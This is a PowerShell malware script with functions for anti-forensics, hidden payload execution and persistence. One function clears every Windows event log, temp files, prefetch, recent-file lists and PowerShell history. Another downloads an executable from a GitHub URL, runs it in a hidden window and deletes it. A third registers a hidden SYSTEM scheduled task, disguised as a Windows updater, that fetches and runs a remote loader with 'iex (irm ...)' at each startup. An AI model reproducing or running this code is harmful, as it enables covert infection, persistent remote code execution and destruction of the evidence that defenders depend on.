# Silent cleanup function (no prompts)
function Clear-AllTracesSilent {
    try {
        # Clear event logs silently
        wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null }
        
        # Clear temp files
        Remove-Item -Path "$env:temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:windir\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Clear prefetch
        Get-ChildItem "$env:windir\Prefetch\*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        # Clear recent files (silent)
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -Recurse -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -Recurse -ErrorAction SilentlyContinue
        
        # Clear registry
        Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        
        # Clear PowerShell history
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
    } catch {}
}

# Check process without prompt
function Test-TargetProcessSilent {
    $processNames = @("explorerr", "cmd", "runtime", "svchost", "dllhost", "Discord")
    foreach ($proc in $processNames) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

# Alternative execution method - using temporary file with auto-clean
function Invoke-TempExecution {
    $targetUrl = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
    
    Write-Host "[+] Using temporary execution method..." -ForegroundColor Yellow
    
    try {
        # Download to temp location
        $tempFile = Join-Path $env:temp "tmp_$(Get-Random).exe"
        Invoke-WebRequest -Uri $targetUrl -OutFile $tempFile -UserAgent "Mozilla/5.0"
        
        if (-not (Test-Path $tempFile)) {
            return $false
        }
        
        # Verify it's a valid executable
        $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
        if ($fileBytes[0] -ne 0x4D -or $fileBytes[1] -ne 0x5A) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            return $false
        }
        
        # Start process hidden
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $tempFile
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        # Wait a bit for process to start
        Start-Sleep -Seconds 2
        
        # Clean temp file immediately
        for ($i = 0; $i -lt 10; $i++) {
            try {
                Remove-Item $tempFile -Force -ErrorAction Stop
                Write-Host "[✓] Temporary file cleaned" -ForegroundColor Green
                break
            } catch {
                Start-Sleep -Milliseconds 100
            }
        }
        
        return $true
        
    } catch {
        # Cleanup on failure
        try { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue } catch {}
        return $false
    }
}

# Fileless persistence
function Set-FilelessPersistence {
    Write-Host "[+] Setting fileless persistence..." -ForegroundColor Yellow
    
    try {
        $taskName = "\Microsoft\Windows\SystemDataUpdater"
        
        # Remove existing task
        try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        
        # Create new task
        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/main/loader.txt')`""
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:03:00"
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew
        
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows System Data Update" -Force | Out-Null
        
        Write-Host "[✓] Fileless persistence set" -ForegroundColor Green
    } catch {
        Write-Host "[!] Persistence setup failed" -ForegroundColor Red
    }
}
